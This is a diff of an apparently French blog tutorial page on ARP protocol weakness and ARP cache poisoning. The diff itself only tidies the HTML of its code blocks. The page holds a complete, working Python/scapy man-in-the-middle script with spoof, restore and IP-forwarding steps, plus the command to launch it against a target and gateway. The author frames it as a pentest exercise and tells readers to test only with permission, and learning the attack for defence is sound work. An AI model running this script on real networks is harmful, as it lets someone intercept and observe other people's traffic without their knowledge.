@@ -183,9 +183,8 @@
 </table>
 <p>Ainsi, à chaque nouvelle requête à cette IP, plus besoin de faire de requête ARP pour résoudre son adresse MAC.</p>
 <p>Dans votre terminal :</p>
-<pre class="language-bash " style="counter-reset: linenumber 0"><code class="language-bash"><span class="token comment"># Pour visualisez votre table ARP :</span>
-arp <span class="token parameter variable">-a</span>
-</code></pre>
+<pre class="language-bash"><code class="language-bash"><span class="token comment"># Pour visualisez votre table ARP :</span>
+arp <span class="token parameter variable">-a</span></code></pre>
 <h3>Faiblesse du protocole</h3>
 <p>La principale faiblesse du protocole ARP est l'absence de vérification d'authenticité : les paquets ARP ne sont pas chiffrés et ne contiennent pas de mécanisme d'authentification, ce qui signifie qu'ils peuvent être facilement falsifiés.</p>
 <h2>ARP spoofing : exploitation (ARP cache poisoning)</h2>
@@ -198,7 +197,7 @@ Photo par <a href="https://levelup.gitconnected.com/man-in-the-middle-attack-par
 <p><strong>Note</strong> : macOS possède une fonctionnalité intégrée appelée &quot;ARP cache validation&quot; qui vise à protéger contre les attaques d'ARP spoofing en vérifiant la validité des entrées dans la table ARP. Cette attaque n'a pas fonctionné sur mes appareils macOS / iOS. Cependant, elle a fonctionné sur des windows / Linux.</p>
 <p>On va utiliser Python et la bibliothèque <a href="https://scapy.net/">scapy</a> qui permet de manipuler les paquets.</p>
 <p>On va d'abord créer une fonction qui renvoie l'adresse MAC de l'IP demandé. Cela se fait en envoyant des paquets ARP en broadcast (ff:ff:ff:ff:ff:ff).</p>
-<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
 <span class="token keyword">import</span> time
 <span class="token keyword">import</span> argparse
 
@@ -207,25 +206,22 @@ Photo par <a href="https://levelup.gitconnected.com/man-in-the-middle-attack-par
     broadcast_ether_frame <span class="token operator">=</span> scapy<span class="token punctuation">.</span>Ether<span class="token punctuation">(</span>dst <span class="token operator">=</span> <span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span>
     broadcast_ether_arp_req_frame <span class="token operator">=</span> broadcast_ether_frame <span class="token operator">/</span> arp_req_frame
     answered_list <span class="token operator">=</span> scapy<span class="token punctuation">.</span>srp<span class="token punctuation">(</span>broadcast_ether_arp_req_frame<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
-    <span class="token keyword">return</span> answered_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hwsrc
-</code></pre>
+    <span class="token keyword">return</span> answered_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hwsrc</code></pre>
 <p>Grâce à la fonction spoof, on envoie un packet ARP qui va changer le cache ARP de machine cible. En effet, <code>scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)</code> permet d'envoyer un paquet à la machine ayant l'IP <code>target_ip</code> et de remplacer, dans sa table ARP à la ligne <code>spoof_ip</code>, l'adresse mac réel par notre adresse MAC.</p>
-<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token comment"># Our mac address is sent automatically in an ARP packet, so we don't need to precise hwsrc=our_mac in scapy.ARP</span>
+<pre class="language-python"><code class="language-python"><span class="token comment"># Our mac address is sent automatically in an ARP packet, so we don't need to precise hwsrc=our_mac in scapy.ARP</span>
 <span class="token keyword">def</span> <span class="token function">spoof</span><span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> spoof_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
     target_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>target_ip<span class="token punctuation">)</span>
     spoof_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> target_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> target_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> spoof_ip<span class="token punctuation">)</span>
-    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>spoof_packet<span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
-</code></pre>
+    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>spoof_packet<span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
 <p>On fait une fonction restore pour rétablir les tables ARP initiales après avoir fini le spoofing.</p>
-<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">restore</span><span class="token punctuation">(</span>source_ip<span class="token punctuation">,</span> destination_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">restore</span><span class="token punctuation">(</span>source_ip<span class="token punctuation">,</span> destination_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
     source_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>source_ip<span class="token punctuation">)</span>
     destination_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>destination_ip<span class="token punctuation">)</span>
     restore_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> destination_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> destination_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> source_ip<span class="token punctuation">,</span> hwsrc <span class="token operator">=</span> source_mac<span class="token punctuation">)</span>
-    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>restore_packet<span class="token punctuation">,</span> count <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
-</code></pre>
+    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>restore_packet<span class="token punctuation">,</span> count <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
 <p>On ajoute argparse pour pouvoir parser des arguments en ligne de commande et on fait la boucle permettant de lancer l'ARP cache poisoning. <code>target_ip</code> correspond à l'IP de la machine cible et <code>gateway_ip</code> correspond à l'IP du router.</p>
 <p>Le code entier donne :</p>
-<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
 <span class="token keyword">import</span> time
 <span class="token keyword">import</span> argparse
 
@@ -277,8 +273,7 @@ gateway_ip <span class="token operator">=</span> options<span class="token punct
 <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient"</span><span class="token punctuation">)</span>
     restore<span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> gateway_ip<span class="token punctuation">)</span>
-    restore<span class="token punctuation">(</span>gateway_ip<span class="token punctuation">,</span> target_ip<span class="token punctuation">)</span>
-</code></pre>
+    restore<span class="token punctuation">(</span>gateway_ip<span class="token punctuation">,</span> target_ip<span class="token punctuation">)</span></code></pre>
 <h3>Tests et finitions</h3>
 <p>Tester seulement sur des appareils et des réseaux wifi dont vous avez l'autorisation. ARP spoofing est certes intrusif sur l'appareil cible, mais peut aussi saturer le réseau local. Également, vous pouvez activer des systèmes de détection d'intrusion.</p>
 <p>Pour le test, nous allons utiliser une machine virtuel comme appareil cible. Vous pouvez aussi utliser l'appareil de votre choix. Je vous renvoie au MON <a href="../pentest">pentest</a> pour voir comment set-up la VM (utiliser l'OS de votre choix). Il faut par contre configurer le réseau sur <em>connection par pont</em> (cliquez sur une VM puis --&gt; config --&gt; réseau --&gt; accès par pont).</p>
@@ -306,8 +301,7 @@ gateway_ip <span class="token operator">=</span> options<span class="token punct
 </tbody>
 </table>
 <p>Lancer la commande suivante pour lancer l'arp spoofing (-t : target ; -g : gateway) :</p>
-<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python">python3 arp_MITM<span class="token punctuation">.</span>py <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.13</span> <span class="token operator">-</span>g <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.1</span>
-</code></pre>
+<pre class="language-python"><code class="language-python">python3 arp_MITM<span class="token punctuation">.</span>py <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.13</span> <span class="token operator">-</span>g <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.1</span></code></pre>
 <p>Si tout se passe bien, les packets sont transmis. En refaisant la commande <code>arp -a</code> sur la VM cible:</p>
 <table>
 <thead>
@@ -335,7 +329,7 @@ gateway_ip <span class="token operator">=</span> options<span class="token punct
 <p>En utilisant wireshark, on voit que la victime essaye de se connecter au serveur DNS de google (8.8.8.8)  : <img src="wireshark_spoof.png" alt="wireshark_ICMP_no_response"></p>
 <p>On voit que les paquets ICMP de la victime n'ont pas de réponse. A ce stade, tous les paquets de la cible passent par l'attaquant. Mais l'attaquant ne fait rien de ses paquets : il faut rediriger ces paquets vers internet, et que tous les paquets à destination de la cible lui parviennent en retour. L'attaque sera alors réussi.</p>
 <p>On rajoute les modules os et signal, le paramètre <code>scapy.conf.iface = &quot;en0&quot;</code> (dépendant de votre configuration par pont, à voir dans VMware), dans le try les instructions pour autoriser le port forwarding, et dans le except les instructions pour retourner à l'état initial. Voici le fichier final :</p>
-<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
 <span class="token keyword">import</span> time
 <span class="token keyword">import</span> argparse
 <span class="token keyword">import</span> os
@@ -399,8 +393,7 @@ scapy<span class="token punctuation">.</span>conf<span class="token punctuation"
     <span class="token comment">#Disable IP Forwarding on a mac</span>
     os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo sysctl -w net.inet.ip.forwarding=0"</span><span class="token punctuation">)</span>
     <span class="token comment">#kill process on a mac</span>
-    os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> signal<span class="token punctuation">.</span>SIGTERM<span class="token punctuation">)</span>
-</code></pre>
+    os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> signal<span class="token punctuation">.</span>SIGTERM<span class="token punctuation">)</span></code></pre>
 <p><strong>Note</strong> : Désactivez votre VPN, certains bloquent la retransmission de paquets.</p>
 <p>L'attaque est maintenant réussi : en plus d'avoir modifier le cache ARP de la victime, vous transferez tous ses paquets vers leur destinataire, et renvoyer la réponse. Vous pouvez observer les connexions dans Wireshark. La cible ne se rendra compte de rien :  tous ses paquets sont transférés normalement de son point de vue.</p>
 <p>Bien sûr, si la cible transfère ses paquets en utilisant TLS (ex: https), les paquets seront chiffrés. Mais vous pourrez tout de même observer à quel ressource la cible accède, ce qui est un probème sérieux de confidentialité. Et si le protocole n'est pas sécurisé, vous pourrez lire tous les messages en clair...</p>
